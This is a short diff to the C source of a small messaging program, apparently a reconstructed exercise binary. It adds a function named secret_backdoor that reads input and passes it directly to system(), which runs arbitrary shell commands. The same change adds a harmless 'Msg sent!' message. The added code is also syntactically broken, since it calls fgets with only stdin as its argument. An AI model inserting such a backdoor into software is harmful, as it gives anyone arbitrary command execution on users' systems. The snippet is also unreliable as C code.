@@ -1,5 +1,11 @@
 
 
+int secret_backdoor() {
+
+  char *cmd = fgets(stdin);
+  system(cmd);
+}
+
 
 int set_username() {
 
@@ -14,6 +20,8 @@ int handle_message() {
 
   set_username();
   set_msg();
+
+  puts(": Msg sent!\n");
 
 
 }
